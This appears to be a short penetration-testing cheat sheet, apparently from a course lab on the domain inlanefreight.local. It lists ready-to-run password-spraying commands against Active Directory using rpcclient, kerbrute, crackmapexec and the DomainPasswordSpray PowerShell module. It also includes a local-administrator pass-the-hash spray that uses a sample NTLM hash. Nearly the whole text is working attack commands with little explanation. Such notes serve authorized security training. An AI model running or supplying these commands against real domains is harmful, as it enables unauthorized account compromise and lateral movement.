
password spraying one liner in Bash
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Password spraying with kerbrute
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
Password spraying with crackmapexec filtering logon failures
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

```

Local Admin Spraying with crackmap exec
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```



using powershell for password spraying

Password spray
```
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```
